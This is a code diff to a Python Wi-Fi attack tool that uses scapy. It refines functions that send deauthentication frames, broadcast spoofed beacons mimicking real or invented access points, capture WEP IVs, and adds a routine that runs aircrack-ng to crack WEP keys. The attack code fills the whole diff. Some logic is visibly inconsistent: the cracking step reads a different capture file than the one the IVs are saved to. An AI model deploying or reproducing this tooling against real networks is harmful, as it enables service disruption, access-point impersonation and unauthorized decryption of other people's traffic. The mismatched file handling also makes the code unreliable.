@@ -1,3 +1,5 @@
+import subprocess
+import sys
 from deauth import deauth, beacon, deauth_with_beacon
 from scapy.all import Dot11Beacon, Dot11, sniff, Dot11WEP, PcapWriter, RandMAC
 from typing import Union
@@ -88,6 +90,7 @@ class Scanner:
         # save the dictionary to the file
         with open(filename, "w") as file:
             json.dump(scan, file, indent=4)
+        print(f"Network topology has been saved to file {filename}")
         LOGGER.info(f"Network scan has been saved to file {filename}")
 
     def png_scan(self, filename: str) -> None:
@@ -175,13 +178,6 @@ class Scanner:
 
         return Wifi(ssid, bssid, dbm_signal, channel, crypto, country, max_rate, beacon_interval)
 
-    def test(self):
-        def _callback(packet):
-            stats = packet[Dot11Beacon].network_stats()
-            print(stats)
-            print(stats['country'])
-
-        sniff(prn=_callback, iface=self.interface, timeout=self.timeout, count=4)
 
     def handle_clients(self, packet, client_list: list[list[str]]) -> list[list[str]]:
         """Function to handle the clients connected to the APs
@@ -331,6 +327,7 @@ class Scanner:
         LOGGER.debug("Function 'send_deauth' is running")
         if not self.wifis:
             print("AP list is empty, please scan the network first.")
+            time.sleep(0.5)
             return
         target_ap = self.prompt_for_ap()
         set_channel(self.interface, target_ap.channel)
@@ -362,6 +359,7 @@ class Scanner:
         LOGGER.debug("Function 'send_deauth_with_beacon' is running")
         if not self.wifis:
             print("AP list is empty, please scan the network first.")
+            time.sleep(0.5)
             return
         target_ap = self.prompt_for_ap()
         set_channel(self.interface, target_ap.channel)
@@ -388,29 +386,24 @@ class Scanner:
 
         deauth_with_beacon(self.interface, target_ap.SSID, target_ap.BSSID, target_client)
 
-    def send_beacon(self):  # TODO: Rewrite this function
-        """Function to send beacon packets to APs"""
+    def send_beacon(self):
+        """Function to send beacon packets"""
         LOGGER.debug("Function 'send_beacon' is running")
-        choice = input("1. Pick AP from list to mimic\n2. User defined AP\nInput choice: ")
-        if choice == "1":
-            if not self.wifis:
-                print("AP list is empty, please scan the network first.")
-                return
-            target_ap = self.prompt_for_ap()
-            set_channel(self.interface, target_ap.channel)
-            beacon(self.interface, target_ap.BSSID, target_ap.SSID)
-        elif choice == "2":    
-            SSID = input("Write SSID to mimic ")
-            BSSID = input("Write MAC address to mimic ('0' for random MAC) ")
-            if BSSID == '0':
-                BSSID = str(RandMAC())
-            if input("Do you want to broadcast beacon frames? (y,n) ").lower() == "n":
-                client = input("Write MAC address of client to send to")
-                beacon(self.interface, BSSID, SSID, client)
-            else:
-                beacon(self.interface, BSSID, SSID)
+        self.show_aps()
+        print("\n")
+        SSID =  input("Write SSID to mimic ")
+        BSSID = input("Write MAC address to mimic ('0' for random MAC) ").strip()
+        if BSSID == '0':
+            BSSID = str(RandMAC())
+        beacon(self.interface, BSSID, SSID)
+
 
     def get_ivs(self):
+        LOGGER.debug("Function 'get_ivs' is running")
+        if not self.wifis:
+            print("AP list is empty, please scan the network first.")
+            time.sleep(0.5)
+            return
         # Create file to save IVs to
         pktdump = PcapWriter("iv_file.cap", append=True, sync=True)
 
@@ -425,7 +418,8 @@ class Scanner:
 
         # Get AP to sniff from
         target_ap = self.prompt_for_ap()
-        if not target_ap.crypto == "WEP":
+        
+        if not target_ap.crypto == "{'WEP'}":
             print("AP is not WEP encrypted. Please choose another AP.")
             return
         set_channel(self.interface, target_ap.channel)
@@ -433,5 +427,19 @@ class Scanner:
 
         sniff(iface=self.interface, prn=filter_WEP, timeout=int(time_for_sniff))
 
-        print(f'IVs saved to file: {pktdump.filename}')
+        print(f'IVs saved to file: {pktdump.filename}.\n')
+
+
+    def crack_wep(self):
+        """Function to crack WEP encryption"""
+        LOGGER.debug("Function 'crack_wep' is running")
+        # Check if we have a file with IVs
+        if not os.path.isfile("iv_file.cap"):
+            print("No file with IVs found. Please capture IVs first.")
+            time.sleep(0.5)
+            return
+        # Crack WEP encryption
         # os.system(f'Aircrack-ng {pktdump.filename}') Doesn't work
+        command = f"aircrack-ng output-01.cap"
+        subprocess.call(command, shell=True)
+        sys.exit(0)
